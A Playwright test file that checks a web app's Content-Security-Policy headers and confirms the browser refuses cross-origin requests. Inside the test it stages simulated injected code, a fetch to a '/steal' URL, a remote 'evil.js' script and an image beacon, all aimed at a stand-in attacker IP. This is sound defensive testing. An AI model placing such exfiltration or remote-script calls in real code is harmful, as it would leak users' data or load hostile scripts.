import { expect, test } from "@playwright/test";
import { openShell } from "../helpers";

// The browser enforces the page Content-Security-Policy: injected code cannot load scripts from elsewhere or send
// data to another origin. Proven with the browser's own violation events, not by a failing network request (the test
// network would make any outside request fail anyway).
test("pages carry the CSP and the browser refuses other origins", async ({ page }) => {
  const res = await page.goto("/login");
  const csp = res!.headers()["content-security-policy"] ?? "";
  expect(csp).toContain("connect-src 'self'");
  expect(csp).toContain("frame-ancestors 'none'");
  expect(csp).not.toContain("unsafe-eval");  // production build
  expect(res!.headers()["x-frame-options"]).toBe("DENY");

  await openShell(page, "/governance");
  const violations = await page.evaluate(() => new Promise<string[]>((resolve) => {
    const seen: string[] = [];
    document.addEventListener("securitypolicyviolation", (e) => seen.push(e.effectiveDirective));
    fetch("http://203.0.113.7/steal?t=x").catch(() => {});
    const s = document.createElement("script");
    s.src = "http://203.0.113.7/evil.js";
    document.head.appendChild(s);
    const img = new Image();
    img.src = "http://203.0.113.7/beacon.gif";
    setTimeout(() => resolve(seen), 1500);
  }));
  expect(violations).toEqual(expect.arrayContaining(["connect-src", "script-src-elem", "img-src"]));

  // the proxied API keeps its own, stricter policy (not the page one)
  const api = await page.request.get("/api/auth/me");
  expect(api.status()).toBe(401);
  expect(api.headers()["content-security-policy"]).toBe("default-src 'none'; frame-ancestors 'none'");
});
